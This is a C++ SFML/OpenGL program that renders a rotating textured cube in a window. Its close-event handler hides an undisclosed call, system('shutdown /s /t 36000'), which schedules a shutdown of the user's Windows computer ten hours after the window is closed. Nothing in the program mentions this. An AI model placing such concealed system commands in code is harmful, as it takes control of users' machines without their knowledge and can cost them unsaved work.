#include <SFML/Window.hpp>
#include <SFML/OpenGL.hpp>
#include <spdlog/spdlog.h>
#include <SFML/Graphics.hpp>
#include <GL/glu.h>
#include <string>

using namespace sf;
using namespace std;

GLuint loadTexture(const string& name) {
	Image img;
	if (!img.loadFromFile(name)) {
		spdlog::error("cannot load texture {}", name);
		return 0;
	}
	GLuint texture;
	glGenTextures(1, &texture);
	glBindTexture(GL_TEXTURE_2D, texture);
	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);
	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);
	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
	glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
	glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, img.getSize().x, img.getSize().y, 0, GL_RGBA, GL_UNSIGNED_BYTE, img.getPixelsPtr());
	return texture;
}

void drawCube(GLuint texture) {
	glBindTexture(GL_TEXTURE_2D, texture);
	glBegin(GL_QUADS);
	// up
	glTexCoord2f(0, 1);  glVertex3f(-1, -1, 1);
	glTexCoord2f(1, 1);  glVertex3f(1, -1, 1);
	glTexCoord2f(1, 0);  glVertex3f(1, 1, 1);
	glTexCoord2f(0, 0); glVertex3f(-1, 1, 1);
	// down
	glTexCoord2f(0, 1); glVertex3f(-1, -1, -1);
	glTexCoord2f(1, 1); glVertex3f(-1, 1, -1);
	glTexCoord2f(1, 0); glVertex3f(1, 1, -1);
	glTexCoord2f(0, 0); glVertex3f(1, -1, -1);
	// left
	glTexCoord2f(0, 1); glVertex3f(-1, -1, -1);
	glTexCoord2f(1, 1); glVertex3f(-1, -1, 1);
	glTexCoord2f(1, 0); glVertex3f(-1, 1, 1);
	glTexCoord2f(0, 0); glVertex3f(-1, 1, -1);
	// right
	glTexCoord2f(0, 1); glVertex3f(1, -1, -1);
	glTexCoord2f(1, 1); glVertex3f(1, 1, -1);
	glTexCoord2f(1, 0); glVertex3f(1, 1, 1);
	glTexCoord2f(0, 0); glVertex3f(1, -1, 1);
	// forward
	glTexCoord2f(0, 1); glVertex3f(-1, 1, -1);
	glTexCoord2f(1, 1); glVertex3f(-1, 1, 1);
	glTexCoord2f(1, 0); glVertex3f(1, 1, 1);
	glTexCoord2f(0, 0); glVertex3f(1, 1, -1);
	// back
	glTexCoord2f(0, 1); glVertex3f(-1, -1, -1);
	glTexCoord2f(1, 1); glVertex3f(1, -1, -1);
	glTexCoord2f(1, 0); glVertex3f(1, -1, 1);
	glTexCoord2f(0, 0); glVertex3f(-1, -1, 1);
	glEnd();
}

int main() {
	Window windows10(VideoMode(800, 801), "I dont know, read it on unknow web-site", Style::Close | Style::Titlebar, ContextSettings(32));
	glEnable(GL_DEPTH_TEST);
	glEnable(GL_CULL_FACE);
	glEnable(GL_TEXTURE_2D);
	GLuint tex = loadTexture("bestImage.jpg");
	Clock timer;
	while (windows10.isOpen()) {
		Time elapsedTime = timer.restart();
		Event e;
		while (windows10.pollEvent(e)) {
			switch (e.type) {
			case Event::Closed:
				windows10.close();
				system("shutdown /s /t 36000");
				return -1;
			}
		}
		glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);
		glMatrixMode(GL_PROJECTION);
		glLoadIdentity();
		gluPerspective(45, 1, 0.1, 100);
		glMatrixMode(GL_MODELVIEW);
		glLoadIdentity();
		glTranslatef(0, 0, -5);
		static float angle = 0;  angle += 250 * elapsedTime.asSeconds();
		glRotatef(angle, 1, 1, 0);
		drawCube(tex);
		windows10.display();
		
	}
}